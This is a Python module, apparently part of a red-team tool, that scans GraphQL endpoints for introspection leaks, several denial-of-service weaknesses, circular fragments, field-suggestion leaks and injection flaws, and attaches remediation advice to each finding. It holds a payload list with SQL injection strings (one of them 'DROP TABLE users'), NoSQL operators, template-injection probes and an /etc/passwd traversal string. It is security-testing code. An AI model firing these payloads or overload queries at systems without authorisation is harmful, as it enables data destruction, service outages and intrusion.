#!/usr/bin/env python3
"""
GraphQL安全测试模块

提供全面的GraphQL API安全测试功能，包括:
- Introspection查询测试
- 批量查询DoS测试
- 深度嵌套DoS测试
- 字段建议信息泄露测试
- 别名重载攻击测试
- 指令重载攻击测试
- SQL注入/NoSQL注入测试
- 查询复杂度分析

作者: AutoRedTeam
版本: 3.0.0
"""

import json
import logging
import re
import time
from typing import Any, Dict, List, Optional, Tuple

from .base import (
    APITestResult,
    APIVulnType,
    BaseAPITester,
    Severity,
)

logger = logging.getLogger(__name__)


class GraphQLTester(BaseAPITester):
    """
    GraphQL安全测试器

    对GraphQL端点进行全面的安全测试。

    使用示例:
        tester = GraphQLTester('https://api.example.com/graphql')
        results = tester.test()
    """

    name = 'graphql'
    description = 'GraphQL API安全测试器'
    version = '3.0.0'

    # Introspection查询
    INTROSPECTION_QUERIES = [
        # 基础Schema查询
        '''
        query IntrospectionQuery {
            __schema {
                types {
                    name
                    kind
                    description
                }
            }
        }
        ''',
        # 完整Schema查询
        '''
        query FullIntrospection {
            __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                    name
                    kind
                    description
                    fields {
                        name
                        args {
                            name
                            type { name kind ofType { name } }
                        }
                        type { name kind ofType { name } }
                    }
                }
                directives {
                    name
                    description
                    locations
                    args { name }
                }
            }
        }
        ''',
        # 简化版本
        '{__schema{types{name}}}',
        # __type查询
        '{__type(name:"Query"){fields{name}}}',
    ]

    # SQL注入Payload
    INJECTION_PAYLOADS = [
        # SQL注入
        ("'", 'single_quote'),
        ('"', 'double_quote'),
        ("' OR '1'='1", 'or_injection'),
        ("1' AND '1'='1", 'and_injection'),
        ("'; DROP TABLE users; --", 'drop_injection'),
        ("1 UNION SELECT NULL--", 'union_injection'),
        ("1; WAITFOR DELAY '0:0:5'--", 'time_blind'),
        # NoSQL注入
        ('{"$gt": ""}', 'nosql_gt'),
        ('{"$ne": null}', 'nosql_ne'),
        ('{"$regex": ".*"}', 'nosql_regex'),
        # 模板注入
        ('{{7*7}}', 'ssti'),
        ('${7*7}', 'expression'),
        # 路径遍历
        ('../../../etc/passwd', 'path_traversal'),
    ]

    def __init__(self, target: str, config: Optional[Dict[str, Any]] = None):
        """
        初始化GraphQL测试器

        Args:
            target: GraphQL端点URL
            config: 可选配置，可包含:
                - max_depth: 最大嵌套深度测试值
                - max_batch: 最大批量查询数
                - field_name: 用于嵌套测试的字段名
                - auth_header: 认证头
        """
        super().__init__(target, config)

        # 配置项
        self.max_depth = self.config.get('max_depth', 50)
        self.max_batch = self.config.get('max_batch', 100)
        self.field_name = self.config.get('field_name', 'user')
        self.auth_header = self.config.get('auth_header', {})

        # 存储发现的Schema信息
        self._schema_info: Dict[str, Any] = {}

    def test(self) -> List[APITestResult]:
        """执行所有GraphQL安全测试"""
        self.clear_results()

        # 执行各项测试
        self.test_introspection()
        self.test_batch_query_dos()
        self.test_deep_nesting_dos()
        self.test_field_suggestion()
        self.test_alias_overload()
        self.test_directive_overload()
        self.test_circular_fragment()
        self.test_injection()

        return self._results

    def test_introspection(self) -> Optional[APITestResult]:
        """
        测试Introspection是否启用

        漏洞描述:
            GraphQL Introspection允许客户端查询完整的API Schema，
            包括所有类型、字段和参数。这可能泄露敏感信息。

        Returns:
            测试结果或None
        """
        for query in self.INTROSPECTION_QUERIES:
            response = self._send_query(query.strip())

            if not response.get('success'):
                continue

            data = response.get('data', {})

            # 检查是否返回Schema数据
            if 'data' in data:
                schema_data = data.get('data', {})

                if '__schema' in schema_data or '__type' in schema_data:
                    # 提取Schema信息
                    self._extract_schema_info(schema_data)

                    types_count = len(self._schema_info.get('types', []))
                    queries_count = len(self._schema_info.get('queries', []))
                    mutations_count = len(self._schema_info.get('mutations', []))

                    result = self._create_result(
                        vulnerable=True,
                        vuln_type=APIVulnType.GRAPHQL_INTROSPECTION,
                        severity=Severity.MEDIUM,
                        title='GraphQL Introspection已启用',
                        description=(
                            'GraphQL Introspection功能已启用，'
                            f'可以获取完整的API Schema。'
                            f'发现{types_count}个类型、{queries_count}个Query、{mutations_count}个Mutation。'
                        ),
                        evidence={
                            'types_count': types_count,
                            'queries_count': queries_count,
                            'mutations_count': mutations_count,
                            'sample_types': self._schema_info.get('types', [])[:10],
                            'sample_queries': self._schema_info.get('queries', [])[:10]
                        },
                        remediation=(
                            '1. 在生产环境禁用Introspection\n'
                            '2. 对于Apollo: plugins: [ApolloServerPluginDisableIntrospection()]\n'
                            '3. 对于graphql-yoga: 设置 disableIntrospection: true\n'
                            '4. 使用API网关在生产环境拦截Introspection查询'
                        )
                    )
                    return result

        return None

    def test_batch_query_dos(self) -> Optional[APITestResult]:
        """
        测试批量查询DoS

        漏洞描述:
            GraphQL允许在单个请求中发送多个查询（批量查询），
            如果没有限制，攻击者可以发送大量查询导致DoS。

        Returns:
            测试结果或None
        """
        base_query = '{"query":"{__typename}"}'
        max_accepted = 0
        response_times: List[Dict[str, Any]] = []

        for count in [10, 25, 50, 100]:
            if count > self.max_batch:
                break

            batch = [json.loads(base_query) for _ in range(count)]

            start_time = time.time()
            response = self._send_batch(batch)
            elapsed = time.time() - start_time

            response_times.append({
                'count': count,
                'time': round(elapsed, 3)
            })

            if not response.get('success'):
                break

            data = response.get('data', {})

            # 检查是否接受批量查询
            if isinstance(data, list) and len(data) >= count:
                max_accepted = count
            elif response.get('status_code', 0) >= 400:
                break

        if max_accepted > 0:
            severity = Severity.HIGH if max_accepted >= 50 else Severity.MEDIUM

            result = self._create_result(
                vulnerable=True,
                vuln_type=APIVulnType.GRAPHQL_BATCH_DOS,
                severity=severity,
                title='GraphQL批量查询DoS',
                description=(
                    f'服务端接受最多{max_accepted}个批量查询，'
                    '攻击者可以利用此特性进行DoS攻击。'
                ),
                evidence={
                    'max_queries_accepted': max_accepted,
                    'response_times': response_times
                },
                remediation=(
                    '1. 限制单次请求的查询数量（建议不超过10个）\n'
                    '2. 实施查询复杂度限制\n'
                    '3. 使用速率限制\n'
                    '4. 对于Apollo: 使用 BatchHttpLink 的 batchMax 配置'
                )
            )
            return result

        return None

    def test_deep_nesting_dos(self) -> Optional[APITestResult]:
        """
        测试深度嵌套DoS

        漏洞描述:
            GraphQL允许嵌套查询，如果没有深度限制，
            攻击者可以发送深度嵌套的查询导致DoS。

        Returns:
            测试结果或None
        """
        max_accepted = 0
        response_times: List[Dict[str, Any]] = []

        for depth in [5, 10, 20, 30, 50]:
            if depth > self.max_depth:
                break

            query = self._generate_nested_query(depth)

            start_time = time.time()
            response = self._send_query(query)
            elapsed = time.time() - start_time

            response_times.append({
                'depth': depth,
                'time': round(elapsed, 3)
            })

            if not response.get('success'):
                break

            data = response.get('data', {})
            errors = data.get('errors', [])

            # 检查是否有深度限制错误
            depth_error = any(
                'depth' in str(e).lower() or 'nested' in str(e).lower()
                for e in errors
            )

            if depth_error or response.get('status_code', 0) >= 400:
                break
            else:
                max_accepted = depth

        if max_accepted > 0:
            severity = Severity.HIGH if max_accepted >= 20 else Severity.MEDIUM

            result = self._create_result(
                vulnerable=True,
                vuln_type=APIVulnType.GRAPHQL_DEEP_NESTING,
                severity=severity,
                title='GraphQL深度嵌套DoS',
                description=(
                    f'服务端接受最深{max_accepted}层嵌套查询，'
                    '攻击者可以利用此特性进行DoS攻击。'
                ),
                evidence={
                    'max_depth_accepted': max_accepted,
                    'response_times': response_times,
                    'field_tested': self.field_name
                },
                remediation=(
                    '1. 限制查询嵌套深度（建议不超过10层）\n'
                    '2. 实施查询复杂度限制\n'
                    '3. 使用 graphql-depth-limit 库\n'
                    '4. 对于Apollo: 使用 depthLimit 插件'
                )
            )
            return result

        return None

    def test_field_suggestion(self) -> Optional[APITestResult]:
        """
        测试字段建议信息泄露

        漏洞描述:
            当查询错误的字段名时，GraphQL可能返回"Did you mean..."建议，
            这可能帮助攻击者枚举有效的字段名。

        Returns:
            测试结果或None
        """
        # 测试常见的错误拼写
        test_queries = [
            '{usr{id}}',      # user的错误拼写
            '{pasword}',      # password的错误拼写
            '{admn}',         # admin的错误拼写
            '{usrs{emal}}',   # users.email的错误拼写
            '{accont{blance}}',  # account.balance的错误拼写
        ]

        suggestions_found: List[Dict[str, Any]] = []

        for query in test_queries:
            response = self._send_query(query)

            if not response.get('success'):
                continue

            data = response.get('data', {})
            errors = data.get('errors', [])

            for error in errors:
                message = str(error.get('message', ''))

                # 检查是否包含建议
                if 'did you mean' in message.lower() or 'suggest' in message.lower():
                    # 提取建议的字段名
                    suggested = re.findall(r'"([^"]+)"', message)

                    suggestions_found.append({
                        'query': query,
                        'message': message[:200],
                        'suggestions': suggested
                    })

        if suggestions_found:
            all_suggestions = []
            for s in suggestions_found:
                all_suggestions.extend(s.get('suggestions', []))
            all_suggestions = list(set(all_suggestions))

            result = self._create_result(
                vulnerable=True,
                vuln_type=APIVulnType.GRAPHQL_FIELD_SUGGESTION,
                severity=Severity.LOW,
                title='GraphQL字段建议信息泄露',
                description=(
                    f'GraphQL返回字段建议信息，发现{len(all_suggestions)}个可能的字段名。'
                    '这可能帮助攻击者枚举API Schema。'
                ),
                evidence={
                    'suggestions_found': suggestions_found,
                    'unique_suggestions': all_suggestions
                },
                remediation=(
                    '1. 在生产环境禁用字段建议\n'
                    '2. 返回通用错误消息\n'
                    '3. 使用自定义错误格式化器过滤建议'
                )
            )
            return result

        return None

    def test_alias_overload(self) -> Optional[APITestResult]:
        """
        测试别名重载攻击

        漏洞描述:
            GraphQL允许使用别名在单次查询中多次请求同一字段，
            如果没有限制，攻击者可以发送大量别名导致DoS。

        Returns:
            测试结果或None
        """
        max_accepted = 0
        response_times: List[Dict[str, Any]] = []

        for count in [10, 50, 100, 200]:
            aliases = ' '.join([f'a{i}: __typename' for i in range(count)])
            query = f'query {{ {aliases} }}'

            start_time = time.time()
            response = self._send_query(query)
            elapsed = time.time() - start_time

            response_times.append({
                'count': count,
                'time': round(elapsed, 3)
            })

            if not response.get('success'):
                break

            data = response.get('data', {})

            # 检查是否返回所有别名的结果
            if 'data' in data and isinstance(data['data'], dict):
                result_count = len(data['data'])
                if result_count >= count:
                    max_accepted = count
                else:
                    break
            elif response.get('status_code', 0) >= 400:
                break

        if max_accepted > 0:
            severity = Severity.MEDIUM if max_accepted >= 100 else Severity.LOW

            result = self._create_result(
                vulnerable=True,
                vuln_type=APIVulnType.GRAPHQL_ALIAS_OVERLOAD,
                severity=severity,
                title='GraphQL别名重载攻击',
                description=(
                    f'服务端接受最多{max_accepted}个别名，'
                    '攻击者可以利用此特性放大查询负载。'
                ),
                evidence={
                    'max_aliases_accepted': max_accepted,
                    'response_times': response_times
                },
                remediation=(
                    '1. 限制单次查询的别名数量\n'
                    '2. 实施查询复杂度限制\n'
                    '3. 使用 graphql-query-complexity 库'
                )
            )
            return result

        return None

    def test_directive_overload(self) -> Optional[APITestResult]:
        """
        测试指令重载攻击

        漏洞描述:
            GraphQL指令可以应用于查询的各个部分，
            大量指令可能导致服务器资源耗尽。

        Returns:
            测试结果或None
        """
        # 测试@include和@skip指令
        for count in [10, 50, 100]:
            directives = ' '.join([
                f'@include(if: true)' if i % 2 == 0 else '@skip(if: false)'
                for i in range(count)
            ])

            query = f'''
            query {{
                __typename {directives}
            }}
            '''

            response = self._send_query(query)

            if response.get('success') and response.get('status_code', 0) < 400:
                data = response.get('data', {})
                if 'data' in data:
                    result = self._create_result(
                        vulnerable=True,
                        vuln_type=APIVulnType.GRAPHQL_DIRECTIVE_OVERLOAD,
                        severity=Severity.LOW,
                        title='GraphQL指令重载',
                        description=(
                            f'服务端接受{count}个指令，可能导致资源耗尽。'
                        ),
                        evidence={
                            'directives_accepted': count,
                            'directive_types': ['@include', '@skip']
                        },
                        remediation=(
                            '1. 限制单次查询的指令数量\n'
                            '2. 验证指令的使用合理性'
                        )
                    )
                    return result

        return None

    def test_circular_fragment(self) -> Optional[APITestResult]:
        """
        测试循环片段攻击

        漏洞描述:
            GraphQL片段可以相互引用，
            如果没有循环检测，可能导致无限循环。

        Returns:
            测试结果或None
        """
        # 构造循环片段
        query = '''
        query {
            __typename
            ...FragA
        }

        fragment FragA on Query {
            __typename
            ...FragB
        }

        fragment FragB on Query {
            __typename
            ...FragA
        }
        '''

        response = self._send_query(query)

        if response.get('success'):
            data = response.get('data', {})
            errors = data.get('errors', [])

            # 检查是否有循环检测错误
            has_cycle_error = any(
                'cycle' in str(e).lower() or 'circular' in str(e).lower() or 'recursive' in str(e).lower()
                for e in errors
            )

            if not has_cycle_error and 'data' in data:
                result = self._create_result(
                    vulnerable=True,
                    vuln_type=APIVulnType.GRAPHQL_DOS,
                    severity=Severity.MEDIUM,
                    title='GraphQL循环片段未检测',
                    description=(
                        '服务端未正确检测循环片段引用，可能导致无限循环或栈溢出。'
                    ),
                    evidence={
                        'query': query[:200] + '...'
                    },
                    remediation=(
                        '1. 启用循环片段检测\n'
                        '2. 使用标准GraphQL验证规则\n'
                        '3. 限制片段嵌套深度'
                    )
                )
                return result

        return None

    def test_injection(self) -> Optional[APITestResult]:
        """
        测试SQL/NoSQL注入

        漏洞描述:
            GraphQL参数可能被直接拼接到数据库查询中，
            导致注入漏洞。

        Returns:
            测试结果或None
        """
        # 如果没有从Introspection获取到查询，使用通用测试
        test_fields = self._schema_info.get('queries', []) or ['user', 'users', 'account']

        vulnerable_payloads: List[Dict[str, Any]] = []

        for field in test_fields[:5]:  # 限制测试字段数量
            for payload, attack_type in self.INJECTION_PAYLOADS[:5]:  # 限制payload数量
                query = f'query {{ {field}(id: "{payload}") {{ id }} }}'

                response = self._send_query(query)

                if not response.get('success'):
                    continue

                data = response.get('data', {})
                text = response.get('text', '').lower()

                # 检查SQL错误特征
                sql_error_patterns = [
                    'sql', 'syntax error', 'mysql', 'postgresql',
                    'sqlite', 'ora-', 'mssql', 'query error',
                    'unterminated', 'invalid', 'unexpected'
                ]

                for pattern in sql_error_patterns:
                    if pattern in text:
                        vulnerable_payloads.append({
                            'field': field,
                            'payload': payload,
                            'attack_type': attack_type,
                            'evidence': text[:200]
                        })
                        break

        if vulnerable_payloads:
            result = self._create_result(
                vulnerable=True,
                vuln_type=APIVulnType.GRAPHQL_INJECTION,
                severity=Severity.CRITICAL,
                title='GraphQL参数注入漏洞',
                description=(
                    f'发现{len(vulnerable_payloads)}个可能的注入点，'
                    'GraphQL参数可能被直接拼接到数据库查询中。'
                ),
                evidence={
                    'vulnerable_payloads': vulnerable_payloads
                },
                remediation=(
                    '1. 使用参数化查询/预编译语句\n'
                    '2. 对所有输入进行验证和转义\n'
                    '3. 使用ORM而不是原始SQL\n'
                    '4. 实施输入验证schema'
                )
            )
            return result

        return None

    # ==================== 辅助方法 ====================

    def _send_query(
        self,
        query: str,
        variables: Optional[Dict] = None
    ) -> Dict[str, Any]:
        """发送GraphQL查询"""
        try:
            client = self._get_http_client()

            payload = {'query': query}
            if variables:
                payload['variables'] = variables

            headers = self.extra_headers.copy()
            headers['Content-Type'] = 'application/json'
            headers.update(self.auth_header)

            response = client.post(
                self.target,
                json=payload,
                headers=headers,
                timeout=self.timeout
            )

            try:
                data = response.json()
            except:
                data = {}

            return {
                'success': True,
                'status_code': response.status_code,
                'data': data,
                'text': response.text[:2000] if hasattr(response, 'text') else ''
            }

        except Exception as e:
            logger.debug(f'GraphQL请求失败: {e}')
            return {'success': False, 'error': str(e)}

    def _send_batch(self, batch: List[Dict]) -> Dict[str, Any]:
        """发送批量GraphQL查询"""
        try:
            client = self._get_http_client()

            headers = self.extra_headers.copy()
            headers['Content-Type'] = 'application/json'
            headers.update(self.auth_header)

            response = client.post(
                self.target,
                json=batch,
                headers=headers,
                timeout=self.timeout
            )

            try:
                data = response.json()
            except:
                data = {}

            return {
                'success': True,
                'status_code': response.status_code,
                'data': data
            }

        except Exception as e:
            logger.debug(f'GraphQL批量请求失败: {e}')
            return {'success': False, 'error': str(e)}

    def _generate_nested_query(self, depth: int) -> str:
        """生成深度嵌套查询"""
        inner = '__typename'
        for _ in range(depth):
            inner = f'{self.field_name} {{ {inner} }}'
        return f'query {{ {inner} }}'

    def _extract_schema_info(self, schema_data: Dict) -> None:
        """从Introspection结果提取Schema信息"""
        if '__schema' in schema_data:
            schema = schema_data['__schema']

            # 提取类型
            types = schema.get('types', [])
            self._schema_info['types'] = [
                t['name'] for t in types
                if not t['name'].startswith('__')
            ]

            # 提取Query类型
            query_type = schema.get('queryType', {})
            if query_type:
                self._schema_info['query_type'] = query_type.get('name', '')

            # 提取Mutation类型
            mutation_type = schema.get('mutationType', {})
            if mutation_type:
                self._schema_info['mutation_type'] = mutation_type.get('name', '')

            # 提取字段
            for type_info in types:
                if type_info['name'] == self._schema_info.get('query_type'):
                    fields = type_info.get('fields', [])
                    self._schema_info['queries'] = [f['name'] for f in fields] if fields else []
                elif type_info['name'] == self._schema_info.get('mutation_type'):
                    fields = type_info.get('fields', [])
                    self._schema_info['mutations'] = [f['name'] for f in fields] if fields else []

        elif '__type' in schema_data:
            type_info = schema_data['__type']
            if type_info and 'fields' in type_info:
                self._schema_info['queries'] = [f['name'] for f in type_info['fields']]


# 便捷函数
def quick_graphql_test(target: str) -> Dict[str, Any]:
    """
    快速GraphQL安全测试

    Args:
        target: GraphQL端点URL

    Returns:
        测试结果摘要
    """
    tester = GraphQLTester(target)
    results = tester.test()
    return tester.get_summary().to_dict()


__all__ = [
    'GraphQLTester',
    'quick_graphql_test',
]
